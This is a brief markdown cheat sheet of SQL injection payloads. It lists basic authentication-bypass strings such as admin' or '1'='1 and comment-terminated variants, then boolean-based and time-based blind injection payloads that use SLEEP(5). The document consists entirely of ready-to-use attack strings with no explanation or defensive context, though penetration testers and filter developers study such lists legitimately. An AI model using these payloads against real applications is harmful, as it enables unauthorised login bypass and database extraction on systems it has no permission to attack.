# BASIC INJECTIONS
## BASIC PAYLOADS
```
admin' or '1'='1
admin' or 1 = 1 -- -
admin')-- -
Admin'#
admin' or '1' + '1'-- 
```



# BLIND INJECTIONS
## BOOLEAN BASED PAYLOADS
```
' OR 1=1 --  
' AND 1=2 --  
" OR 1=1 --  
" AND 1=2 --  
```



## TIME BASED PAYLOADS
```
' OR IF(1=1, SLEEP(5), 0) --   
' OR IF(1=2, SLEEP(5), 0) --  
" OR IF(1=1, SLEEP(5), 0) --  
```














